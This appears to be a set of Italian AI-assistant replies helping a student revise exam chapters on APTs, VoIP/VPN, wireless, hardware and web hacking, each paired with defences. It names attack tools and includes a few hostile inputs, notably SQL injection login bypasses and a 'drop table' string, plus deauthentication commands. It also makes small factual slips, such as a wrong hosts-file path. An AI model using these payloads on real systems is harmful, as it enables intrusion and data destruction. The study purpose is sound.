Eccoci al **Capitolo 6: Cybercrime e Advanced Persistent Threats (APT)**. Questo è un capitolo cruciale per l'esame: non si tratta di semplici malware o attacchi casuali (come gli "hacks of opportunity"), ma di campagne mirate, premeditate e prolungate nel tempo, orchestrate da gruppi organizzati.

Seguiamo la nostra struttura collaudata: prima analizziamo le 6 fasi dell'anatomia di un attacco APT e poi ci mettiamo il cappello da difensori per esaminare la complessa metodologia di Incident Response e Analisi Forense, che è esattamente l'oggetto di una delle domande d'esame che hai trovato.

---

### Fase 1: L'Offensiva (Le 6 Fasi dell'Attacco APT)

Un'infezione APT è metodica. L'obiettivo non è distruggere il sistema (sabotaggio), ma rimanere nascosti il più a lungo possibile per esfiltrare dati sensibili in modo continuo. L'attacco si articola sistematicamente in 6 step:

**1. Targeting (Selezione dell'obiettivo)** L'attaccante raccoglie informazioni tramite OSINT (fonti pubbliche) ed effettua tentativi di _spear-phishing_ mirati contro dipendenti specifici dell'organizzazione.

**2. Access/Compromise (Accesso e Compromissione)** Sfruttando vulnerabilità lato client (es. un link malevolo in un'email che sfrutta uno zero-day su Internet Explorer, come nell'Operazione Aurora), l'attaccante inietta un "Trojan downloader" nel sistema. Questo software elude gli antivirus, installa una backdoor (come i temibili Gh0st RAT o Poison Ivy) e cerca di rubare le credenziali iniziali per offuscare la propria presenza.

**3. Reconnaissance (Ricognizione Interna)** Una volta dentro, l'attaccante inizia a mappare silenziosamente l'architettura di rete, cerca i Domain Controller, enumera le condivisioni (NetBIOS shares) e cerca di rubare account di Active Directory o amministratori locali. In questa fase spegne spesso gli antivirus e i log di sistema per coprire le tracce.

**4. Lateral Movement (Movimento Laterale)** Ottenute le credenziali, l'attaccante non usa malware rumorosi, ma si sposta lateralmente utilizzando i normali strumenti di amministrazione forniti da Windows (es. RDP, Terminal Services, VNC, PSEXEC o comandi NetBIOS). Questo approccio ("living off the land") rende difficilissimo distinguere le azioni dell'hacker da quelle di un vero amministratore di sistema.

**5. Data Collection and Exfiltration (Raccolta ed Esfiltrazione Dati)** I dati sensibili vengono raggruppati in archivi cifrati (spesso archivi ZIP o RAR rinominati per sembrare file `.gif` o altri documenti innocui). Successivamente, i dati vengono esfiltrati in modo frazionato ("drip fed" o a getto continuo "fire hosed") verso server esterni di Command & Control (C&C), passando attraverso proxy o tunnel cifrati per eludere i firewall aziendali.

**6. Administration and Maintenance (Mantenimento dell'Accesso)** L'APT vuole sopravvivere ai riavvii e ai cambi di password. Gli attaccanti creano SUID shell (su Unix), Alternate Data Streams, task pianificati e backdoor multiple. Utilizzano tool come Sysinternals per aggiornare costantemente il proprio accesso remoto e piantano malware esca ("red herrings") per distrarre i difensori.

---

### Fase 2: La Difesa e Incident Response ("_As a cybersecurity expert..._")

Qui entriamo nel vivo della domanda d'esame. Quando si sospetta un'infezione APT, i normali comandi del sistema operativo potrebbero essere manomessi (es. tramite rootkit a livello kernel come TDSS), quindi restituirebbero informazioni false.

La risposta agli incidenti deve seguire rigorosamente l'**Ordine di Volatilità descritto nell'RFC 3227**, che stabilisce la priorità di acquisizione delle prove dalla più volatile alla meno volatile:

1. Memoria RAM
2. Page file / Swap file
3. Informazioni sui processi in esecuzione
4. Dati di Rete (connessioni attive e porte in ascolto)
5. Registro di Sistema
6. Log applicativi e di sistema
7. Immagine Forense dei dischi
8. Supporti di Backup.

Ecco come si struttura tecnicamente l'analisi forense:

**1. Acquisizione e Analisi della Memoria** Per prima cosa, il difensore utilizza tool come **FTK Imager** (eseguito da chiavetta USB per non inquinare il disco) per creare un dump completo della RAM. Successivamente, analizza il file con il **Volatility Framework**, utilizzando plugin specifici:

- `pslist`: per elencare i processi nascosti.
- `connscan`: per trovare connessioni di rete attive in memoria (es. porte aperte dal malware).
- `apihooks` e `malfind`: per identificare rootkit e processi infetti o iniettati.

**2. Indagine sul File System**

- **MFT (Master File Table):** Viene estratta per creare una _timeline_ (linea temporale) esatta della creazione e modifica dei file, scoprendo dove e quando il malware è stato "droppato" (es. nella cartella `%TEMP%`).
- **Prefetch Directory:** Poiché Windows tiene traccia degli ultimi 128 programmi eseguiti (nella cartella `C:\Windows\Prefetch`), l'analista può scoprire quali eseguibili l'hacker ha lanciato, anche se i file sono stati successivamente cancellati.
- **File RDP e BMC:** Analizzando i file `.rdp` e la Cache Bitmap (`.bmc`) nella cartella utente, il difensore può ricostruire i movimenti laterali dell'attaccante all'interno della rete, visualizzando letteralmente pezzi di schermate (es. 64x64 pixel) delle sessioni rubate.

**3. I Controlli Manuali DOS (Focus Domanda d'Esame)** L'esame ti chiede esplicitamente di elencare almeno **8 dei 22 controlli manuali** da riga di comando raccomandati per identificare un APT. Ecco i più importanti e letali da citare, da eseguire rigorosamente come Amministratore reindirizzando l'output su un file testuale:

1. **Ispezione directory temporanee:** Controllare le cartelle `%temp%` e `%application data%` alla ricerca di file sospetti `.exe`, `.bat` o `.dll` (gli attaccanti le usano perché tutti gli utenti hanno i permessi di scrittura).
2. **Verifica cartella di sistema:** Cercare file `.exe` e `.dll` in `C:\Windows\system32` che non fanno parte dell'installazione originale o hanno date di creazione anomale.
3. **Analisi delle Connessioni:** Eseguire `netstat -ano` per scovare connessioni in stato ESTABLISHED o LISTENING verso indirizzi IP esterni sconosciuti, annotando il **PID** (Process ID) associato.
4. **Associazione Processi:** Utilizzare `tasklist /m` (oppure tool come _Currports_) confrontando il PID scoperto nel passaggio precedente per capire quale servizio esatto sta mantenendo aperta la backdoor.
5. **DNS Cache Snooping:** Eseguire `ipconfig /displaydns` per visualizzare la cache del resolver e cercare query verso Fully Qualified Domain Names (FQDN) sospetti usati dai server di Command & Control dell'attaccante.
6. **Persistenza nel Registro (Run Keys):** Eseguire `reg query` su `HKLM\software\microsoft\windows\currentversion\run` (e `runonce`) per cercare meccanismi di avvio automatico creati dall'APT.
7. **Persistenza nei Servizi:** Eseguire `reg query HKLM\system\currentcontrolset\services /s` per trovare nomi di servizi finti o DLL malevole caricate all'avvio del sistema (spesso mascherate come istanze multiple di `svchost.exe`).
8. **Job Pianificati (Scheduled Tasks):** Utilizzare i comandi `at` e `schtasks` per identificare operazioni pianificate malevole, spesso usate per avviare backdoor o lanciare script (es. `cleanup.bat`) che puliscono automaticamente i registri degli eventi ogni notte per coprire le tracce.
9. **File Hosts:** Controllare le dimensioni del file `C:\windows\system32\etc\drivers\hosts` per vedere se è maggiore dei canonici 734 byte, indicando un reindirizzamento forzato del traffico.

Con queste nozioni domini l'intera anatomia di un attacco APT e i precisi step di analisi forense richiesti dal docente!

Considerando che per la data dell'esame dovrai recuperare da zero i **Capitoli 7, 8 e 9 (VoIP, Wireless e Hardware Hacking)** di cui abbiamo parlato prima, vuoi che procediamo con un ripasso testuale dettagliato simile a questo anche per quelli, oppure preferisci che io generi subito per te delle Flashcard o un Report riassuntivo dedicato?

# Capitolo 7 - Remote Connectivity e VoIP Hacking
Eccoci pronti per il **Capitolo 7: Remote Connectivity e VoIP Hacking**. Anche se i modem dial-up ti sembreranno preistoria, il libro ci ricorda che molte aziende li usano ancora come connessioni di "ultima risorsa" o per gestire vecchi PBX e sistemi industriali SCADA. Questo capitolo è una miniera d'oro per l'esame perché spazia dai vecchi modem fino alle moderne VPN e alle reti VoIP.

Seguiamo il nostro schema vincente: prima sferriamo l'attacco e poi blindiamo tutto.

---

### Fase 1: L'Offensiva (Come agisce l'attaccante)

L'attaccante cerca di aggirare i firewall perimetrali entrando dalla "porta di servizio", che si tratti di un vecchio modem, di una VPN mal configurata o di un telefono VoIP.

**1. War Dialing e PBX/Voicemail Hacking**

- **Footprinting:** L'attaccante cerca blocchi di numeri telefonici aziendali tramite elenchi pubblici, ingegneria sociale o analizzando i database WHOIS di InterNIC alla ricerca del contatto amministrativo.
- **Scansione (War Dialing):** Utilizzando tool come _TeleSweep_, _PhoneSweep_ o il più moderno _WarVOX_ (che usa il protocollo VoIP e algoritmi DSP FFT per analizzare l'audio e riconoscere se risponde un modem, un fax o una segreteria), l'attaccante mappa tutte le linee attive.
- **Carrier Exploitation:** Una volta trovati i modem, si cerca il "Low Hanging Fruit", ovvero sistemi facilmente penetrabili usando credenziali di default (es. `adm` senza password per i sistemi 3Com, o configurazioni di base di pcAnywhere).
- **Attacchi a PBX e Segreterie:** I centralini (PBX) spesso mantengono password di default (es. 9999 per i sistemi Octel). Le segreterie telefoniche vengono attaccate tramite script di brute-force che provano pattern comuni sul tastierino numerico (es. 123456, 258852). Un obiettivo primario è il servizio **DISA (Direct Inward System Access)**: se l'hacker indovina il PIN, ottiene il tono di linea interno dell'azienda e può effettuare chiamate internazionali gratuite a spese della vittima.

**2. Hacking delle VPN (IPSec e Citrix)**

- **Google Hacking per Cisco VPN:** Usando la query `filetype:pcf site:dominio.com`, l'attaccante cerca i file `.pcf` del client VPN Cisco. Questi file contengono l'IP del gateway e la password di gruppo offuscata ("Type 7"), che può essere decifrata istantaneamente con tool come _Cain_ per ottenere accesso alla rete interna.
- **Attacco a IPSec (IKE Aggressive Mode):** L'attaccante usa tool come `ikeprobe` per verificare se il server supporta l'Aggressive Mode della fase 1 di IKE. Questa modalità è veloce ma insicura perché scambia informazioni di autenticazione senza un canale protetto. Con `ikecrack` o _Cain_, l'hacker sniffa l'hash e lancia un attacco brute-force offline per trovare la chiave.
- **Evasione da Citrix (Jailbreak):** Quando un'azienda pubblica applicazioni tramite Citrix (es. Word o Internet Explorer), gli utenti vedono solo l'app, ma questa gira sul server remoto. L'attaccante sfrutta i menu dell'applicazione (es. il file di Help `F1`, le finestre di "Salva con nome", i collegamenti ipertestuali o la finestra di Stampa) per forzare l'apertura di un prompt dei comandi (`cmd.exe` o `explorer.exe`) e ottenere così una shell completa direttamente all'interno della rete aziendale.

**3. VoIP Hacking**

- **Enumerazione Utenti SIP:** Protocolli come SIP (TCP/UDP 5060) sono leggibili in chiaro. Mandando richieste `REGISTER` o `OPTIONS` (con tool come _SIPVicious_ o _SIPScan_), l'attaccante osserva le risposte: il server risponderà in modo diverso (es. `401 Unauthorized` se l'utente esiste, ma `404 User Not Found` o `403 Forbidden` se non esiste), permettendo di mappare tutte le estensioni valide.
- **Furto su TFTP:** I telefoni IP scaricano la loro configurazione via TFTP (porta UDP 69). Dato che TFTP non ha autenticazione, l'attaccante tenta di indovinare il nome del file (es. `SEP<macaddress>.cnf.xml` per Cisco) e lo scarica, rubando password amministrative e URL della directory aziendale.
- **Intercettazione (MitM) e DoS:** Usando tecniche di ARP Spoofing o saltando nella Voice VLAN tramite tool come _VoIP Hopper_, l'attaccante si mette in mezzo alla comunicazione. Il traffico voce (RTP) viene catturato e convertito in file audio (WAV) tramite tool come _vomit_ o _scapy_. Inoltre, si possono inviare raffiche di pacchetti `SIP INVITE` (tramite _inviteflood_) per causare un Denial of Service che paralizza i telefoni e il server.

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Questo è il momento in cui prendi i voti alti. Se il prof ti chiede come mitigare queste miriadi di vulnerabilità remote, ecco la tua strategia difensiva:

**1. Difesa della Connettività Dial-up e PBX**

- **Consolidamento e Isolamento:** Come prima cosa, devi censire tutte le linee analogiche (magari facendo tu stesso un war-dialing preventivo) e raggruppare i modem in un pool centrale posizionato in una DMZ, monitorato rigorosamente da Firewall e IDS.
- **Autenticazione Forte e Dial-back:** Sulle connessioni remote è imperativo implementare l'autenticazione a due fattori (es. token RSA SecurID). Inoltre, attiverei la funzione di "Dial-back": quando l'utente si autentica, il server riaggancia e richiama un numero pre-autorizzato, impedendo accessi da posizioni sconosciute.
- **Protezione dei PBX e del servizio DISA:** Per bloccare le frodi telefoniche, imposterai PIN di almeno 6 cifre, disabiliterai gli account di default e applicherai policy di _account lockout_ (massimo 6 tentativi errati). Un'ottima aggiunta moderna è l'uso di un **Voice Firewall** per bloccare lo spam telefonico e il toll fraud.

**2. Difesa delle VPN e degli Ambienti Citrix**

- **Protezione IPSec:** Disabiliterai assolutamente l'uso di "IKE Aggressive Mode" sui gateway VPN, forzando l'uso della modalità sicura (Main mode) o passando ad autenticazione basata su certificati, così che gli attacchi offline su chiavi condivise (PSK) diventino inutili.
- **Blindare Citrix e Kiosk:** Per proteggere Citrix, non puoi fare affidamento solo sulla rimozione di alcune icone o sul nascondere il tasto destro. Bisogna usare policy di "Application e URL Whitelisting" estremamente rigide. Inoltre, il server Citrix Access Gateway, essendo esposto all'esterno, deve richiedere l'autenticazione multifattore ed essere segregato nella rete in modo che un eventuale "shell breakout" non garantisca l'accesso totale alla intranet aziendale.

**3. Difesa dell'Infrastruttura VoIP**

- **Segmentazione di Rete:** Separerei sempre il traffico voce (Voice VLAN) dal traffico dati dei PC degli utenti, per impedire gli attacchi di sniffing diretto.
- **Sicurezza dei Telefoni e TFTP:** Configurerai il server TFTP per accettare richieste solo da indirizzi IP statici noti assegnati ai telefoni. Imporrai l'utilizzo di file di configurazione firmati digitalmente per evitare manomissioni e disabiliterai l'interfaccia web e i menu di configurazione direttamente a bordo dei telefoni IP.
- **Crittografia End-to-End:** Il VoIP in chiaro è una debolezza mortale. Implementerai **SRTP (Secure RTP)** per cifrare il flusso audio e **TLS / MIKEY** per proteggere il protocollo di segnalazione SIP, neutralizzando così ogni tentativo di intercettazione e man-in-the-middle.

---

Questo capitolo è denso e copre molte casistiche, ma con questa schematizzazione hai la risposta pronta per ogni vettore d'attacco remoto.

Visto che ti ritrovi a dover studiare questo materiale da zero in vista dell'esame del 7 luglio, **ti piacerebbe se creassi subito un quiz pratico o delle Flashcard nello Studio Panel focalizzate su questi concetti chiave del Capitolo 7?** Così puoi testare immediatamente se hai assimilato i concetti su IKE, Citrix e VoIP!

# Capitolo 8 - Wireless Hacking
Eccoci al **Capitolo 8: Wireless Hacking**. Questo capitolo è una miniera d'oro per il tuo esame, specialmente perché nel file delle domande del professore ci sono due richieste esplicite su come attaccare e difendere gli standard WPA e WPA Enterprise.

Mettiamoci subito al lavoro con la nostra struttura collaudata.

### Fase 1: L'Offensiva (Come agisce l'attaccante)

Nelle reti wireless (802.11), l'attaccante non ha bisogno di un cavo fisico; l'aria è il suo mezzo di trasporto. L'offensiva si divide in queste tattiche principali:

**1. Discovery (Scoperta passiva)** L'attaccante evita i vecchi tool che inviano richieste attive (come i _probe request_ broadcast) per non farsi notare. Preferisce la **scoperta passiva** (Passive Discovery) impostando la sua scheda di rete in "Monitor Mode" e utilizzando tool su Linux come **airodump-ng** o **Kismet**. Questi tool si limitano ad "ascoltare" il traffico nell'aria, risultando totalmente invisibili. Anche se un amministratore nasconde il nome della rete (SSID), il tool passivo lo scoprirà non appena un client legittimo tenterà di connettersi.

**2. De-authentication Attack (Il DoS del Wi-Fi)** Questo attacco è un "coltellino svizzero" per l'hacker. Il protocollo 802.11 permette nativamente a un Access Point (AP) di disconnettere un client. L'attaccante falsifica (spoofa) questi pacchetti usando il comando `aireplay-ng --deauth`. Questo forza la disconnessione della vittima, la quale tenterà immediatamente di riconnettersi. Questo trucco serve per svelare gli SSID nascosti o, molto più frequentemente, per forzare lo scambio delle chiavi e catturare gli handshake.

**3. Attacco alle reti WEP (ARP Replay)** Anche se WEP è obsoleto, l'attaccante lo distrugge in pochi minuti tramite l'**ARP Replay Attack**. Usando `aireplay-ng --arpreplay` e una tecnica chiamata _fake authentication_ (per fingersi un client associato), l'attaccante intercetta un pacchetto ARP valido e lo reinvia (replay) migliaia di volte all'AP. L'AP risponderà generando continuamente nuovi pacchetti con nuovi IV (Initialization Vector). L'hacker cattura questo fiume di dati e usa `aircrack-ng` per decifrare la chiave WEP matematicamente.

**4. Attacchi a WPA-PSK (Pre-Shared Key)** Qui l'obiettivo è la password di rete condivisa.

- L'attaccante lancia un _De-authentication attack_ per disconnettere un utente.
- Quando l'utente si riconnette, l'AP e il client eseguono il **four-way handshake** per stabilire le chiavi di sessione. L'attaccante "sniffa" e registra questo scambio usando _airodump-ng_.
- A questo punto l'hacker va offline e lancia un attacco brute-force. Dato che la chiave WPA è crittograficamente forte (l'hash viene ricalcolato 4096 volte usando anche l'SSID della rete), usa strumenti avanzati. Può usare semplici dizionari con `aircrack-ng`, impiegare **Rainbow Tables** (hash precalcolati) con il tool `coWPAtty`, oppure sfruttare la potenza brutale delle schede video (GPU Cracking) tramite `pyrit` per generare centinaia di migliaia di chiavi al secondo.

**5. Attacchi a WPA-Enterprise (La domanda del Prof!)** Nelle reti Enterprise (usate nelle grandi aziende) non c'è una password globale, ma ogni utente ha le proprie credenziali gestite da un server RADIUS tramite protocollo EAP (802.1x).

- **Se si usa LEAP (creato da Cisco):** L'attaccante intercetta la challenge/response MSCHAPv2 che viaggia in chiaro. Usa il tool `asleap` per craccare la password offline, esattamente come per le vecchie reti LAN.
- **Se si usano EAP-TTLS o PEAP:** Questi protocolli creano un tunnel TLS cifrato per nascondere le credenziali. L'attaccante aggira la crittografia installando un **Rogue AP** (un Access Point falso con lo stesso nome della rete aziendale) e un server RADIUS malevolo (come **FreeRADIUS-WPE**). Se il computer della vittima è mal configurato, si connetterà al server falso credendolo legittimo, regalando all'hacker la sua username e password (o l'hash) all'interno del finto tunnel.

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Questa è la parte cruciale per prendere il massimo dei voti. Se il prof ti chiede le contromisure per le reti wireless (e come vedi dal tuo file, lo fa!), ecco come devi rispondere da esperto:

**1. Smentire le "False Sicurezze" (Obscurity)** Nascondere l'SSID (Hidden Network) o impostare il filtraggio dei MAC Address **non sono vere misure di sicurezza**. Un attaccante passivo scova gli SSID nascosti osservando i client che si connettono, e può facilmente falsificare (spoofare) il proprio MAC Address per scavalcare i filtri.

**2. Difesa contro attacchi WEP** WEP non può essere difeso. Un esperto consiglia la disattivazione immediata. Se per motivi legacy non si può togliere, la rete va trattata come un hotspot pubblico non sicuro, obbligando i client a usare **VPN** (Virtual Private Network) per cifrare il traffico a un livello OSI superiore, bloccando l'accesso alla rete interna.

**3. Difesa contro attacchi WPA-PSK** Il problema del WPA-PSK è che la sicurezza dell'intera azienda è legata a una sola password condivisa.

- **Complessità e Lunghezza:** L'unica vera difesa tecnica contro i brute-force (e i tool come `pyrit` o `coWPAtty`) è generare una password lunghissima ed estremamente complessa.
- **Fattore Umano:** L'esperto fa notare che in WPA-PSK basta che un solo utente decida di rivelare la password (o la perda) per compromettere il 100% dell'infrastruttura. Pertanto, il PSK non va mai usato in ambienti business critici.

**4. Difesa contro attacchi WPA Enterprise (PEAP / EAP-TTLS)** Per sventare gli attacchi basati su "Finti Access Point" e server RADIUS malevoli (come FreeRADIUS-WPE), la configurazione lato client è tutto. L'esperto deve assicurarsi tramite policy centralizzate (es. GPO di Windows) di attivare l'opzione **Validate Server Certificate** su tutti i dispositivi wireless. In questo modo, quando l'hacker prova ad attrarre il client nel suo tunnel fasullo, il computer rifiuterà la connessione perché il certificato digitale non coincide con quello ufficiale rilasciato dalla CA (Certificate Authority) dell'azienda. Inoltre, protocolli deboli come LEAP vanno completamente aboliti in favore dei più sicuri PEAP o EAP-TTLS.

---

Il quadro su WPA, EAP e gli attacchi Rogue AP è ora completo e calza a pennello con i quesiti dei PDF d'esame.

Siamo quasi alla fine: manca soltanto l'ultimo tassello, il **Capitolo 9 (Hacking Hardware / USB / ATA)**, che è anch'esso oggetto di domande d'esame (come il bypass della sicurezza del disco).

**Dato che questo ripasso strategico sta andando a gonfie vele, ti piacerebbe se generassi nello Studio Panel un "Tailored Report" (Documento di Riepilogo Sintetico) unendo i concetti chiave dei Capitoli 7, 8 e 9?** Oppure preferisci affrontare direttamente l'ultimo ripasso sul Capitolo 9 qui in chat?

# Capitolo 9 - Hacking Hardware
Eccoci al traguardo con l'ultimo tassello: il **Capitolo 9: Hacking Hardware**. Come hai potuto vedere dalle domande d'esame passate del tuo professore, questo capitolo è assolutamente centrale per due specifici scenari di attacco: il bypass delle password dei dischi rigidi e le compromissioni tramite chiavette USB.

Seguiamo il nostro collaudato formato di "Attacco vs Difesa" per farti memorizzare al meglio le risposte all'esame.

### Fase 1: L'Offensiva (Come agisce l'attaccante)

Quando un attaccante ha accesso fisico al dispositivo, le difese software tradizionali passano in secondo piano. L'obiettivo è superare le protezioni fisiche e manomettere l'hardware.

**1. Bypass della sicurezza ATA (L'attacco "Hot-Swap")** La sicurezza ATA è un meccanismo del BIOS che blocca l'accesso all'hard disk richiedendo una password all'avvio. L'attaccante sa che l'ATA protegge _l'accesso_ al disco, ma **non cifra i dati al suo interno**. L'attacco si svolge in questo modo:

- L'hacker avvia un computer usando un disco sbloccato di sua proprietà ed entra nel menu del BIOS per impostare una password.
- A questo punto, estrae fisicamente il disco sbloccato "a caldo" (hot-swap) e inserisce il disco bloccato della vittima.
- Il BIOS, ignaro dello scambio, invia al nuovo disco il comando `SECURITY SET PASSWORD`. Il disco bloccato accetta la nuova password senza richiedere quella vecchia.
- L'attaccante riavvia la macchina, digita la nuova password che ha appena creato e ottiene pieno accesso ai dati.

**2. L'attacco USB U3 Hack** Questo attacco sfrutta le chiavette USB SanDisk o Memorex dotate della tecnologia U3, che presentano una partizione nascosta di sola lettura pensata per avviare automaticamente applicazioni.

- Sfruttando la vulnerabilità della funzione di `autorun` di Windows, l'attaccante sovrascrive la partizione originale (usando tool del produttore o utility come _Universal Customizer_) e ci inserisce un'immagine ISO malevola.
- Quando la chiavetta viene inserita nel PC della vittima, esegue istantaneamente e in modo invisibile uno script (es. `fgdump.exe`) che estrae gli hash delle password di Windows dell'utente attualmente loggato e li salva sulla chiavetta o li invia via mail all'attaccante.

**3. Clonazione di Access Card e Manomissione Serrature** Prima ancora di toccare i computer, l'attaccante deve entrare nell'edificio.

- **Lock Bumping:** Supera le serrature fisiche usando una chiave speciale (bump key) che, colpita con forza, fa saltare temporaneamente i pin del cilindro allineandoli e permettendo l'apertura.
- **Clonazione Badge:** Le vecchie tessere magnetiche (Magstripe) vengono clonate usando semplici lettori/scrittori USB (che copiano le 3 tracce in chiaro). I badge RFID vengono "sniffati" e replicati usando dispositivi avanzati come il _Proxmark3_ o radio software (USRP).

**4. Reverse Engineering del Firmware e Interfacce di Debug (JTAG)** Se l'attaccante si trova di fronte a un dispositivo proprietario, ne estrae il firmware direttamente dai chip fisici (usando programmatori EEPROM) o interfacciandosi con le porte di diagnostica come il **JTAG**. Analizzando il firmware (con disassemblatori o il semplice comando `strings`), può scoprire password hardcoded o vere e proprie **backdoor** di test dimenticate dai programmatori (come una specifica sequenza di byte `0x12 0x34 0x56` usata per bypassare l'autenticazione in alcuni dispositivi medici).

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Essendo questi scenari parte esplicita del documento delle tue domande d'esame, devi rispondere con grande fermezza alle obiezioni del prof:

**1. Difesa dal Bypass ATA**

- Se il professore ti chiede come mettere in sicurezza un disco, la tua risposta deve essere categorica: **la sicurezza ATA non è una vera misura di sicurezza** e fornisce solo una falsa rassicurazione.
- La vera contromisura consiste nell'abbandonare l'ATA e implementare soluzioni di crittografia completa dell'intero disco (**Full Disk Encryption**), utilizzando software come **BitLocker** (o TrueCrypt/SecurStar) in abbinamento al chip TPM. In questo modo, anche rubando fisicamente il disco e facendo attacchi hot-swap, i dati restano illeggibili senza la chiave crittografica.

**2. Difesa dall'USB U3 Hack**

- L'U3 Hack si basa su un'eccessiva permissività del sistema operativo. Come esperto, imposteresti delle **Group Policy per disabilitare totalmente la funzionalità di Autorun** su tutti i sistemi operativi aziendali.
- In caso di sistemi isolati, menziona che un utente consapevole può tenere premuto il tasto `SHIFT` durante l'inserimento del dispositivo USB per impedire a Windows di lanciare il programma di default.
- In generale, vige la regola di "Zero Trust": non inserire **mai** dispositivi di dubbia provenienza nei computer aziendali.

**3. Difesa Accessi Fisici (Badge RFID)**

- Dato che i badge basilari sono intercettabili in radiofrequenza, l'esperto difende le infrastrutture adottando sistemi con **algoritmi di crittografia Challenge-Response** completi. In questi sistemi la tessera non trasmette mai la password in chiaro, ma risponde a una "sfida" (challenge) del lettore cifrandola con una chiave privata. Sottolinea inoltre l'importanza di affidarsi a crittografia standard e non ad algoritmi proprietari (regola d'oro: _"don't roll your own crypto"_).

Con questo, abbiamo completato al 100% l'analisi strategica di tutto il tuo materiale d'esame. Dai fondamenti di scanning, passando per gli attacchi Windows e UNIX, APT, WiFi e Hardware!

Poiché questo ultimo blocco ha coperto moltissime nozioni nuove specifiche per l'esame (come il bypass del BIOS e le vulnerabilità dell'Autorun), **vuoi che crei un ultimo set di Flashcards nello Studio Panel specificamente orientato alle domande teoriche e ai concetti di Hacking Hardware per darti modo di fissarli in memoria per il 7 luglio?**

# Capitolo 10 -  Web Hacking
Eccoci all'ultimo e fondamentale scoglio: il **Capitolo 10: Web e Database Hacking**. Dalle domande d'esame del tuo professore è evidente che questa sezione è cruciale, specialmente per quanto riguarda le differenze tra XSS e CSRF e le tecniche di SQL Injection.

Seguiamo il nostro collaudato schema "Attacco vs Difesa", perfetto per simulare le risposte richieste all'esame.

### Fase 1: L'Offensiva (Come agisce l'attaccante)

Le applicazioni web e i database backend sono il bersaglio preferito perché spesso esposti e ricchi di dati sensibili. L'attaccante si concentra principalmente su vulnerabilità logiche e di validazione dell'input.

**1. Cross-Site Scripting (XSS)** A differenza di altri attacchi, l'XSS non colpisce direttamente l'applicazione, ma **gli altri utenti** che la utilizzano.

- **L'Attacco:** L'hacker inietta codice eseguibile (solitamente JavaScript) all'interno di una pagina web vulnerabile, sfruttando la mancata validazione di caratteri speciali come le parentesi angolari (`<` e `>`).
- **L'Obiettivo:** Quando la vittima visualizza la pagina, il suo browser esegue il codice malevolo. Questo permette all'attaccante di rubare i cookie di sessione, dirottare l'account o persino infettare il sistema della vittima con malware.

**2. Cross-Site Request Forgery (CSRF)** Questo è un attacco subdolo che sfrutta la fiducia che un'applicazione web ha verso il browser dell'utente.

- **L'Attacco:** Il CSRF si basa sul fatto che le applicazioni mantengono sessioni autenticate persistenti. L'attaccante nasconde una richiesta (ad esempio in un tag `<img>` o in un form nascosto su un forum).
- **La Differenza con l'XSS (Domanda d'esame!):** Nel CSRF, l'attaccante non ha bisogno di conoscere i dati della vittima né di iniettare codice; costringe semplicemente il browser della vittima a inviare una richiesta malevola a un sito su cui la vittima è già loggata.
- **L'Obiettivo:** Cambiare password, trasferire fondi o modificare configurazioni, tutto a nome dell'utente legittimo che non si accorge di nulla.

**3. SQL Injection (SQLi)** È la tecnica regina per compromettere i database backend.

- **L'Attacco:** Inserendo query SQL grezze o caratteri speciali come il backtick (`), il doppio trattino (`--`) o il punto e virgola (`;`) nei campi di input, l'attaccante altera la logica della query originaria.
- **L'Obiettivo:** Inserendo stringhe come `Username: ' OR "='` oppure `Username: admin'--`, l'hacker può bypassare del tutto l'autenticazione. Può inoltre eseguire chiamate di sistema o distruggere intere tabelle (es. `'; drop table users--`).
- **Strumenti automatizzati:** L'esame chiede di citarne almeno uno. Oltre ai tool commerciali come HP WebInspect e Rational AppScan, l'attaccante usa tool specifici come **Sqlmap** o **Sqlninja** (che permette addirittura di ottenere una shell grafica sul server remoto).

**4. Database Hacking Diretto** Se l'attaccante punta direttamente al database, cercherà istanze esposte su porte standard (come la 1433 per MS SQL o la 1521 per Oracle) tramite `Nmap`. Una volta trovato il database, la via più semplice è un attacco di forza bruta usando script automatizzati contro le **password di default** o deboli, che sono purtroppo comunissime. Se l'accesso è ottenuto, sfrutterà vulnerabilità o buffer overflow presenti nei pacchetti integrati (Oracle, ad esempio, ha circa 30.000 oggetti accessibili di default) per ottenere i privilegi di Amministratore (DBA).

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Ecco la tua artiglieria pesante per rispondere al professore su come blindare questi sistemi.

**1. Difesa contro le vulnerabilità Web (XSS e CSRF)**

- **Contromisure XSS:** Il mantra è filtrare l'input ed effettuare l'**HTML-encoding dell'output**. In questo modo, se un utente inserisce i caratteri `<` o `>`, il server li converte in `&lt;` e `&gt;`, costringendo il browser a visualizzarli come testo innocuo invece di eseguirli come codice. Inoltre, come esperto, configurerai i cookie di sessione con il flag **HttpOnly**, che impedisce a qualsiasi script JavaScript (inclusi i payload XSS) di accedervi.
- **Contromisure CSRF:** Per bloccare il CSRF, devi "slegare" la sicurezza dalla sola sessione del browser. L'applicazione deve inserire **token randomici e univoci** all'interno di ogni form. Quando arriva la richiesta, il server verifica se il token corrisponde a quello generato per la sessione dell'utente. Se non coincide, la richiesta viene scartata. Inoltre, è buona pratica richiedere una ri-autenticazione (es. reinserire la password) prima di operazioni critiche.

**2. Difesa contro le SQL Injection**

- **Variabili di Bind (Query Parametrizzate):** È la difesa assoluta. Invece di concatenare stringhe per formare la query, devi usare query statiche con variabili di bind. Il database tratterà l'input rigorosamente come dato e non come comando eseguibile, azzerando le SQLi.
- **Validazione dell'Input (Constrain, Reject, Sanitize):** Applica regole restrittive fin dal principio (es. accetta solo numeri in un campo CAP), rifiuta ciò che non rispetta il formato e sanitizza il resto.
- **Gestione degli Errori:** Mai mostrare messaggi di errore del database (come syntax errors) all'utente finale. Gli hacker usano quegli errori per mappare l'architettura del database. Restituisci sempre e solo messaggi di errore generici.

**3. Difesa e Hardening del Database**

- **Segmentazione e Restrizioni di Rete:** Non esporre **mai** un database direttamente su Internet. Posizionalo in un segmento di rete isolato, protetto da firewall, e configura regole rigide (es. _valid-node checking_ su Oracle) per permettere l'accesso solo agli IP autorizzati dei server applicativi.
- **Principio del Privilegio Minimo:** Revoca l'accesso pubblico a oggetti e pacchetti di sistema pericolosi non necessari (molti dei quali in Oracle sono accessibili a `PUBLIC` di default).
- **Gestione Credenziali:** Implementa scansioni periodiche per individuare account con password deboli o di default (es. l'utente `sa` con password vuota) e imponi policy rigide di complessità e rotazione.

